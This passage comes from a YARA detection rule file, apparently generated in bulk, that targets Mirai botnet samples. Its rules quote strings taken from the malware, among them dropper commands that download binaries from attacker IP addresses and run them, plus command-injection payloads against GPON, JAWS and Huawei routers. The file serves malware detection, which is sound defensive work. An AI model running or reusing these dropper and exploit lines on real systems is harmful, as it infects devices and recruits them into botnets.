      $s6 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
      $s10 = "N^NuPOST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s11 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s12 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s13 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s14 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s15 = "tvmrepa" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__9233a833 {
   meta:
      description = "_subset_batch - file Mirai(signature)_9233a833.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9233a833a69028a6d7f4ab16e45f41e24a291935db0ee7556410184b769945f6"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s6 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
      $s10 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s11 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s12 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s13 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s14 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s15 = "tvmrepa" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__89966faa {
   meta:
      description = "_subset_batch - file Mirai(signature)_89966faa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "89966faa5b65b975cb2e60bbb72085a0a288c82e876b46a15b1955ddc4b827be"
   strings:
      $s1 = "TCP Bypass Randomized Hex Data." fullword ascii /* score: '15.00'*/
      $s2 = "bot/attk -> starting udp OpenVPN flood" fullword ascii /* score: '13.00'*/
      $s3 = "Resolved %s to %d IPv4 addresses" fullword ascii /* score: '10.00'*/
      $s4 = "Failed to bind udp socket." fullword ascii /* score: '10.00'*/
      $s5 = "[attack/cudp]: failed to bind udp socket." fullword ascii /* score: '10.00'*/
      $s6 = "Couldn't connect to host for ACK Stomp in time. Retrying" fullword ascii /* score: '9.00'*/
      $s7 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__a688fd04 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a688fd04.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a688fd0465fbd2b1b6d5e65736122fd8b620f0b54792ea1d25f30518fd13d436"
   strings:
      $s1 = " 6!: 1<'}4668" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aFh' */
      $s2 = " 6!: <='<#}7*=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g' */
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__a3df34aa {
   meta:
      description = "_subset_batch - file Mirai(signature)_a3df34aa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a3df34aab1129e7059ed677c1b108eb35253147a5d1e4d84e65f14f354421d97"
   strings:
      $s1 = "N^NuPOST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__9a7bc597 {
   meta:
      description = "_subset_batch - file Mirai(signature)_9a7bc597.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9a7bc597eed4470d6e7db61e1dd52667e06423ec0a54df60329f80074e7c1f2b"
   strings:
      $s1 = "N^NuPOST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__70005536 {
   meta:
      description = "_subset_batch - file Mirai(signature)_70005536.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "70005536bddb89a2d5b16c271d398d1bab22623093cd2f5c075126ae93fb5117"
   strings:
      $s1 = "/home/process/" fullword ascii /* score: '15.00'*/
      $s2 = "Killed process: " fullword ascii /* score: '15.00'*/
      $s3 = "/usr/libexec/" fullword ascii /* score: '12.00'*/
      $s4 = "/system/system/bin/" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__7aff0fa4 {
   meta:
      description = "_subset_batch - file Mirai(signature)_7aff0fa4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7aff0fa411809fb52b8fa45d9d1184edb3f5e44b71150450bd243a21c34fa796"
   strings:
      $s1 = "/home/process/" fullword ascii /* score: '15.00'*/
      $s2 = "Killed process: " fullword ascii /* score: '15.00'*/
      $s3 = "/usr/libexec/" fullword ascii /* score: '12.00'*/
      $s4 = "/system/system/bin/" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__ada2a925 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ada2a925.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ada2a92548ba2a008ba0c3b8cee1cb1fc32de62bf0991b1f5a8903544b35c3b3"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s3 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s4 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s5 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s6 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s7 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s8 = "cvkqpav" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__8b02a486 {
   meta:
      description = "_subset_batch - file Mirai(signature)_8b02a486.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8b02a4863525af62416c482217d070a194040659ca966667b23a1a470ddb97bb"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__72424bf0 {
   meta:
      description = "_subset_batch - file Mirai(signature)_72424bf0.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "72424bf08178b97cc45fdc9f8d27c724fdba284e2a192cb89a1f5d7b3b1e766a"
   strings:
      $s1 = "wget http://109.205.213.5/kvariant.arc; chmod 777 kvariant.arc; ./kvariant.arc fox.exploit;" fullword ascii /* score: '27.00'*/
      $s2 = "wget http://109.205.213.5/kvariant.ppc; chmod 777 kvariant.ppc; ./kvariant.ppc fox.exploit;" fullword ascii /* score: '27.00'*/
      $s3 = "wget http://109.205.213.5/kvariant.arm; chmod 777 kvariant.arm; ./kvariant.arm fox.exploit;" fullword ascii /* score: '27.00'*/
      $s4 = "wget http://109.205.213.5/kvariant.spc; chmod 777 kvariant.spc; ./kvariant.spc fox.exploit;" fullword ascii /* score: '27.00'*/
      $s5 = "wget http://109.205.213.5/kvariant.arm7; chmod 777 kvariant.arm7; ./kvariant.arm7 fox.exploit;" fullword ascii /* score: '24.00'*/
      $s6 = "wget http://109.205.213.5/kvariant.x86; chmod 777 kvariant.x86; ./kvariant.x86 fox.exploit;" fullword ascii /* score: '24.00'*/
      $s7 = "wget http://109.205.213.5/kvariant.mips; chmod 777 kvariant.mips; ./kvariant.mips fox.exploit;" fullword ascii /* score: '24.00'*/
      $s8 = "wget http://109.205.213.5/kvariant.arm5; chmod 777 kvariant.arm5; ./kvariant.arm5 fox.exploit;" fullword ascii /* score: '24.00'*/
      $s9 = "wget http://109.205.213.5/kvariant.arm6; chmod 777 kvariant.arm6; ./kvariant.arm6 fox.exploit;" fullword ascii /* score: '24.00'*/
      $s10 = "wget http://109.205.213.5/kvariant.m68k; chmod 777 kvariant.m68k; ./kvariant.m68k fox.exploit;" fullword ascii /* score: '24.00'*/
      $s11 = "wget http://109.205.213.5/kvariant.sh4; chmod 777 kvariant.sh4; ./kvariant.sh4 fox.exploit;" fullword ascii /* score: '24.00'*/
      $s12 = "wget http://109.205.213.5/kvariant.mpsl; chmod 777 kvariant.mpsl; ./kvariant.mpsl fox.exploit;" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__7320621c {
   meta:
      description = "_subset_batch - file Mirai(signature)_7320621c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7320621cbac45ff84118e914faabb96910c4571c7914ffd92102b5534ded1b3d"
   strings:
      $x1 = "cd /tmp; wget http://45.125.66.56/spc; curl -O http://45.125.66.56/spc; ftpget -v 45.125.66.56 spc spc; chmod 777 spc; ./spc tbk" ascii /* score: '34.00'*/
      $x2 = "cd /tmp; wget http://45.125.66.56/arm; curl -O http://45.125.66.56/arm; ftpget -v 45.125.66.56 arm arm; chmod 777 arm; ./arm tbk" ascii /* score: '34.00'*/
      $x3 = "cd /tmp; wget http://45.125.66.56/ppc; curl -O http://45.125.66.56/ppc; ftpget -v 45.125.66.56 ppc ppc; chmod 777 ppc; ./ppc tbk" ascii /* score: '34.00'*/
      $x4 = "cd /tmp; wget http://45.125.66.56/arm6; curl -O http://45.125.66.56/arm6; ftpget -v 45.125.66.56 arm6 arm6; chmod 777 arm6; ./ar" ascii /* score: '31.00'*/
      $x5 = "cd /tmp; wget http://45.125.66.56/spc; curl -O http://45.125.66.56/spc; ftpget -v 45.125.66.56 spc spc; chmod 777 spc; ./spc tbk" ascii /* score: '31.00'*/
      $x6 = "cd /tmp; wget http://45.125.66.56/mpsl; curl -O http://45.125.66.56/mpsl; ftpget -v 45.125.66.56 mpsl mpsl; chmod 777 mpsl; ./mp" ascii /* score: '31.00'*/
      $x7 = "cd /tmp; wget http://45.125.66.56/mips; curl -O http://45.125.66.56/mips; ftpget -v 45.125.66.56 mips mips; chmod 777 mips; ./mi" ascii /* score: '31.00'*/
      $x8 = "cd /tmp; wget http://45.125.66.56/sh4; curl -O http://45.125.66.56/sh4; ftpget -v 45.125.66.56 sh4 sh4; chmod 777 sh4; ./sh4 tbk" ascii /* score: '31.00'*/
      $x9 = "cd /tmp; wget http://45.125.66.56/mips; curl -O http://45.125.66.56/mips; ftpget -v 45.125.66.56 mips mips; chmod 777 mips; ./mi" ascii /* score: '31.00'*/
      $x10 = "cd /tmp; wget http://45.125.66.56/m68k; curl -O http://45.125.66.56/m68k; ftpget -v 45.125.66.56 m68k m68k; chmod 777 m68k; ./m6" ascii /* score: '31.00'*/
      $x11 = "cd /tmp; wget http://45.125.66.56/i686; curl -O http://45.125.66.56/i686; ftpget -v 45.125.66.56 i686 i686; chmod 777 i686; ./i6" ascii /* score: '31.00'*/
      $x12 = "cd /tmp; wget http://45.125.66.56/mpsl; curl -O http://45.125.66.56/mpsl; ftpget -v 45.125.66.56 mpsl mpsl; chmod 777 mpsl; ./mp" ascii /* score: '31.00'*/
      $x13 = "cd /tmp; wget http://45.125.66.56/ppc; curl -O http://45.125.66.56/ppc; ftpget -v 45.125.66.56 ppc ppc; chmod 777 ppc; ./ppc tbk" ascii /* score: '31.00'*/
      $x14 = "cd /tmp; wget http://45.125.66.56/i686; curl -O http://45.125.66.56/i686; ftpget -v 45.125.66.56 i686 i686; chmod 777 i686; ./i6" ascii /* score: '31.00'*/
      $x15 = "cd /tmp; wget http://45.125.66.56/sh4; curl -O http://45.125.66.56/sh4; ftpget -v 45.125.66.56 sh4 sh4; chmod 777 sh4; ./sh4 tbk" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 6KB and
      1 of ($x*)
}

rule Mirai_signature__7355c41d {
   meta:
      description = "_subset_batch - file Mirai(signature)_7355c41d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7355c41de00cab9c1707124729beddcd917237dd22a4e92ae979b4407faaa3d9"
   strings:
      $s1 = "u__get_myaddress: socket" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__8e6c9157 {
   meta:
      description = "_subset_batch - file Mirai(signature)_8e6c9157.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8e6c9157d157077bd61b0a80144670787f855acf1dfe6bd52049e5211994bb4e"
   strings:
      $s1 = "(diicot/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(diicot/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "u__get_myaddress: socket" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__9e80ff8f {
   meta:
      description = "_subset_batch - file Mirai(signature)_9e80ff8f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9e80ff8f1fa9bd1844815d62c84c5e5f84615189670caf001eb229cb58f787dc"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s2 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__a8db5422 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a8db5422.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a8db5422396d8904953e275a0cbbd0eaca05aeccb3863caeddd976b02464a706"
   strings:
      $s1 = "XXXXXXXXXXXXX" fullword wide /* reversed goodware string 'XXXXXXXXXXXXX' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__74198ca6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_74198ca6.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "74198ca689c46dfe80dc0dd177af8886fcae25896aa0a397189e8939d67d3ec0"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.ppc; curl -O http://196.251.84.55/r" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.arc; curl -O http://196.251.84.55/r" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.spc; curl -O http://196.251.84.55/r" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.arm; curl -O http://196.251.84.55/r" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.x86; curl -O http://196.251.84.55/r" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.m68k; curl -O http://196.251.84.55/" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.i686; curl -O http://196.251.84.55/" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.mpsl; curl -O http://196.251.84.55/" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.arm5; curl -O http://196.251.84.55/" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.arm6; curl -O http://196.251.84.55/" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.spc; curl -O http://196.251.84.55/r" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.i468; curl -O http://196.251.84.55/" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.arc; curl -O http://196.251.84.55/r" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.ppc; curl -O http://196.251.84.55/r" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.84.55/renji/renji.mips; curl -O http://196.251.84.55/" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__8641d595 {
   meta:
      description = "_subset_batch - file Mirai(signature)_8641d595.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8641d59537fed13d77c52be6a996ac43a8d0a5e965fe6862e39578b10d708d12"
   strings:
      $s1 = "l1- .gJU" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__76c67cc6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_76c67cc6.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "76c67cc6029e988b6d1891da3accac94130afea79791ed62b1d00ad4e0c9107a"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.ppc; curl -O http://176.65.148.114" ascii /* score: '33.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.mips; curl -O http://176.65.148.11" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.mipsel; curl -O http://176.65.148." ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.arm7; curl -O http://176.65.148.11" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.ppc; curl -O http://176.65.148.114" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.x86_64; curl -O http://176.65.148." ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.i686; curl -O http://176.65.148.11" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.i586; curl -O http://176.65.148.11" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.arm6; curl -O http://176.65.148.11" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.arm5; curl -O http://176.65.148.11" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.arm4; curl -O http://176.65.148.11" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.sh4; curl -O http://176.65.148.114" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.x86_64; curl -O http://176.65.148." ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.i686; curl -O http://176.65.148.11" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.114/bins/plasma.arm7; curl -O http://176.65.148.11" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__7b30ac9b {
   meta:
      description = "_subset_batch - file Mirai(signature)_7b30ac9b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7b30ac9be84b1b5e2cbf1b6f31142cf3ce2a29f101918495cfaebfa74a93d5dd"
   strings:
      $s1 = "(diicot/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(diicot/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__7706b4ac {
   meta:
      description = "_subset_batch - file Mirai(signature)_7706b4ac.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7706b4ac0e8f740ff9184bc691dfc5b8d10415618bb21fa69b64d7c9f0dc98b6"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.ppc; curl -O http://176.46.152." ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arm; curl -O http://176.46.152." ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arc; curl -O http://176.46.152." ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arm; curl -O http://176.46.152." ascii /* score: '29.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arc; curl -O http://176.46.152." ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.ppc; curl -O http://176.46.152." ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.m68k; curl -O http://176.46.152" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arm7; curl -O http://176.46.152" ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.mips64; curl -O http://176.46.1" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arm5; curl -O http://176.46.152" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.x86_64; curl -O http://176.46.1" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.x86; curl -O http://176.46.152." ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.arm6; curl -O http://176.46.152" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.sh4; curl -O http://176.46.152." ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.46.152.89/hiddenbin/Space.mips; curl -O http://176.46.152" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__7745e424 {
   meta:
      description = "_subset_batch - file Mirai(signature)_7745e424.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7745e4242b3e2ed431d0de8dbbfe11f4b5c38830ec166a9b89be55f550838719"
   strings:
      $s1 = "wget http://196.251.71.207/armv7l -O armv7l || curl http://196.251.71.207/armv7l -o armv7l; chmod 777 armv7l; ./armv7l telnet;" fullword ascii /* score: '28.00'*/
      $s2 = "wget http://196.251.71.207/armv6l -O armv6l || curl http://196.251.71.207/armv6l -o armv6l; chmod 777 armv6l; ./armv6l telnet;" fullword ascii /* score: '28.00'*/
      $s3 = "wget http://196.251.71.207/i486 -O i486 || curl http://196.251.71.207/i486 -o i486; chmod 777 i486; ./i486 telnet;" fullword ascii /* score: '28.00'*/
      $s4 = "wget http://196.251.71.207/aarch64 -O aarch64 || curl http://196.251.71.207/aarch64 -o aarch64; chmod 777 aarch64; ./aarch64 tel" ascii /* score: '28.00'*/
      $s5 = "wget http://196.251.71.207/sparc -O sparc || curl http://196.251.71.207/sparc -o sparc; chmod 777 sparc; ./sparc telnet;" fullword ascii /* score: '28.00'*/
      $s6 = "wget http://196.251.71.207/aarch64 -O aarch64 || curl http://196.251.71.207/aarch64 -o aarch64; chmod 777 aarch64; ./aarch64 tel" ascii /* score: '28.00'*/
      $s7 = "wget http://196.251.71.207/powerpc -O powerpc || curl http://196.251.71.207/powerpc -o powerpc; chmod 777 powerpc; ./powerpc tel" ascii /* score: '28.00'*/
      $s8 = "wget http://196.251.71.207/armv5l -O armv5l || curl http://196.251.71.207/armv5l -o armv5l; chmod 777 armv5l; ./armv5l telnet;" fullword ascii /* score: '28.00'*/
      $s9 = "wget http://196.251.71.207/mips -O mips || curl http://196.251.71.207/mips -o mips; chmod 777 mips; ./mips telnet;" fullword ascii /* score: '28.00'*/
      $s10 = "wget http://196.251.71.207/x86_64 -O x86_64 || curl http://196.251.71.207/x86_64 -o x86_64; chmod 777 x86_64; ./x86_64 telnet;" fullword ascii /* score: '28.00'*/
      $s11 = "wget http://196.251.71.207/m68k -O m68k || curl http://196.251.71.207/m68k -o m68k; chmod 777 m68k; ./m68k telnet;" fullword ascii /* score: '28.00'*/
      $s12 = "wget http://196.251.71.207/powerpc -O powerpc || curl http://196.251.71.207/powerpc -o powerpc; chmod 777 powerpc; ./powerpc tel" ascii /* score: '28.00'*/
      $s13 = "wget http://196.251.71.207/arc -O arc || curl http://196.251.71.207/arc -o arc; chmod 777 arc; ./arc telnet;" fullword ascii /* score: '28.00'*/
      $s14 = "wget http://196.251.71.207/armv4l -O armv4l || curl http://196.251.71.207/armv4l -o armv4l; chmod 777 armv4l; ./armv4l telnet;" fullword ascii /* score: '28.00'*/
      $s15 = "wget http://196.251.71.207/mipsel -O mipsel || curl http://196.251.71.207/mipsel -o mipsel; chmod 777 mipsel; ./mipsel telnet;" fullword ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__88e932b0 {
   meta:
      description = "_subset_batch - file Mirai(signature)_88e932b0.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "88e932b053f376300b793058cfff2dc32a31990e125f8b11750e458b8bafd1c9"
   strings:
      $x1 = "wget http://196.251.71.207/aarch64 -O aarch64 || curl http://196.251.71.207/aarch64 -o aarch64; chmod 777 aarch64; ./aarch64 cat" ascii /* score: '33.00'*/
      $x2 = "wget http://196.251.71.207/x86_64 -O x86_64 || curl http://196.251.71.207/x86_64 -o x86_64; chmod 777 x86_64; ./x86_64 catloader" ascii /* score: '33.00'*/
      $x3 = "wget http://196.251.71.207/x86_64 -O x86_64 || curl http://196.251.71.207/x86_64 -o x86_64; chmod 777 x86_64; ./x86_64 catloader" ascii /* score: '33.00'*/
